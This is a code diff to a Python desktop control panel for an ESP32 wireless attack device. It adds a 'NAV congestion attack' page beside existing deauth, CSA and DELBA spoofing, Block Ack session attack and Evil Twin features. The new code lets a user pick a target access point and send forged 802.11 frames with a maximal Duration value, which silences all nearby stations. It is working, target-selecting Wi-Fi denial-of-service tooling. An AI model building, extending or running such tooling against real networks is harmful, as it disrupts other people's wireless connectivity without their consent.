@@ -49,6 +49,7 @@ MENU = [
     ("csa", "CSA 欺骗"),
     ("delba", "DELBA 欺骗"),
     ("ba", "BA 会话攻击"),
+    ("nav", "NAV 拥塞攻击"),
     ("evil", "Evil Twin"),
     ("status", "设备状态"),
     ("log", "日志"),
@@ -61,6 +62,8 @@ DEAUTH_MODES = [
     ("only", "只打勾选", True, "白名单：只打弹窗里勾选的 AP"),
     ("except", "排除勾选", True, "黑名单：打全部 AP，但排除弹窗里勾选的"),
 ]
+
+NAV_MODES = ["mgmt", "cts", "rts", "rtsap", "cfend", "hybrid"]
 
 BA_STEPS = ["512", "256", "1024", "2047", "0 (对照：不推窗口)"]
 
@@ -322,6 +325,9 @@ class DeautherApp:
         self.delba_label = None
         self.ba_step_var = tk.StringVar(value=BA_STEPS[0])
         self.ba_label = None
+        self.nav_mode_var = tk.StringVar(value=NAV_MODES[0])
+        self.nav_dur_var = tk.StringVar(value="32767")
+        self.nav_label = None
 
         root.title("ESP32 Wireless Attack 上位机")
         root.geometry("1040x700")
@@ -381,6 +387,7 @@ class DeautherApp:
         self.pages["csa"] = self._build_csa_page()
         self.pages["delba"] = self._build_delba_page()
         self.pages["ba"] = self._build_ba_page()
+        self.pages["nav"] = self._build_nav_page()
         self.pages["evil"] = self._build_evil_page()
         self.pages["status"] = self._build_status_page()
         self.pages["log"] = self._build_log_page()
@@ -625,6 +632,54 @@ class DeautherApp:
                   "• 底栏 BA 字段：on/off、ADDBA 帧数、BAR 帧数、DELBA 帧数、最后写入的 SSN；\n"
                   "• 实验室结论：只发 2 帧伪造 ADDBA 就能让该 TID 冻结且不自愈（需重新关联），\n"
                   "  但“窗口被推走”这一步还没单独证明（需要 mac80211 目标）。"),
+            justify="left",
+        ).pack(anchor="w", pady=(12, 0))
+        return page
+
+    def _build_nav_page(self):
+        page = self._make_page()
+        ttk.Label(page, text="NAV 拥塞攻击（虚拟载波侦听）", font=("", 12, "bold")).pack(
+            anchor="w", pady=(10, 4))
+        ttk.Label(
+            page,
+            text="用 Duration 字段替信道“上锁”：所有听到的节点按协议保持沉默。"
+                 "mgmt 模式用管理帧携带预约（能持续发），cts/rts 是控制帧（ESP32 上只能发 32 帧）。",
+            foreground="#777777", wraplength=900, justify="left",
+        ).pack(anchor="w", pady=(0, 8))
+
+        bar = ttk.Frame(page)
+        bar.pack(fill="x", pady=(0, 6))
+        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
+        btn.pack(side="left")
+        self.scan_btns["nav"] = btn
+        tbtn = ttk.Button(bar, text="选择目标…", width=13,
+                          command=lambda: self.open_targets(False), state="disabled")
+        tbtn.pack(side="left", padx=6)
+        self.target_btns["nav"] = tbtn
+        self.nav_label = ttk.Label(bar, text="未扫描")
+        self.nav_label.pack(side="left", padx=10)
+
+        params = ttk.Frame(page)
+        params.pack(fill="x", pady=(4, 6))
+        ttk.Label(params, text="模式：").pack(side="left")
+        ttk.Combobox(params, textvariable=self.nav_mode_var, values=NAV_MODES,
+                     state="readonly", width=12).pack(side="left")
+        ttk.Label(params, text="  Duration(µs)：").pack(side="left")
+        ttk.Entry(params, textvariable=self.nav_dur_var, width=10).pack(side="left")
+        ttk.Label(params, text="   32767=满值；1=对照（不做预约）", foreground="#555555").pack(side="left")
+
+        actions = ttk.Frame(page)
+        actions.pack(fill="x", pady=(6, 4))
+        ttk.Button(actions, text="开始 NAV", width=14, command=self.start_nav).pack(side="left")
+        ttk.Button(actions, text="停止", width=10, command=self.nav_stop).pack(side="left", padx=8)
+
+        ttk.Label(
+            page,
+            text=("说明：\n"
+                  "• mgmt：管理帧携带 Duration，实测约 50 fps，是唯一能持续续约的模式；\n"
+                  "• cts/rts/rtsap：控制帧，ESP32 上只能发出 32 帧（驱动队列不回收），适合短促突发；\n"
+                  "• cfend：把别人的 NAV 清零（拆预约）；hybrid：先钉住再放开；\n"
+                  "• 底栏与设备状态页给出 nav/navf/navc/navrx/navdur；攻击停止后吞吐会自己恢复（非破坏性）。"),
             justify="left",
         ).pack(anchor="w", pady=(12, 0))
         return page
@@ -975,6 +1030,28 @@ class DeautherApp:
     def ba_stop(self):
         self._send("BASTOP")
 
+    def start_nav(self):
+        if not self._require_link():
+            return
+        if not self.networks:
+            messagebox.showinfo("提示", "先点“扫描 AP”。")
+            return
+        if self.single_index is None:
+            messagebox.showerror("NAV 参数无效", "先在“选择目标…”里选一个 AP。")
+            return
+        try:
+            duration = int(self.nav_dur_var.get())
+        except ValueError:
+            messagebox.showerror("NAV 参数无效", "Duration 必须是 1–32767 的整数。")
+            return
+        if duration < 1 or duration > 32767:
+            messagebox.showerror("NAV 参数无效", "Duration 必须在 1–32767 之间。")
+            return
+        self._send(f"NAV {self.single_index} {self.nav_mode_var.get()} {duration}")
+
+    def nav_stop(self):
+        self._send("NAVSTOP")
+
     def stop(self):
         self._send("STOP")
 
@@ -1048,6 +1125,7 @@ class DeautherApp:
                 f"({payload.get('delbaf', '-')} 帧 / TID {payload.get('delbat', '-')})    "
                 f"BA：{'on' if payload.get('bamode') == '1' else 'off'} "
                 f"({payload.get('babar', '-')} BAR / SSN {payload.get('bassn', '-')})    "
+                f"NAV：{payload.get('nav', '-')} ({payload.get('navf', '-')} 帧)    "
                 f"网络：{payload.get('networks', '-')}"
                 f"    堆：{payload.get('heap', '-')}{band_hint}"
             )
@@ -1056,7 +1134,8 @@ class DeautherApp:
             for key in ("mode", "eliminated", "deauth_frames", "probe_frames", "networks", "creds",
                         "heap", "ui", "caps", "ch", "rx", "rxm",
                         "delba", "delbaf", "delbac", "delbat", "delbab", "delbar", "delbtr",
-                        "bamode", "baaddba", "babar", "badlba", "bassn", "baerr", "baplant"):
+                        "bamode", "baaddba", "babar", "badlba", "bassn", "baerr", "baplant",
+                        "nav", "navf", "navc", "navrx", "navdur"):
                 if key in payload:
                     self.status_text.insert("end", f"{key:<14}{payload[key]}\n")
             self.status_text.configure(state="disabled")
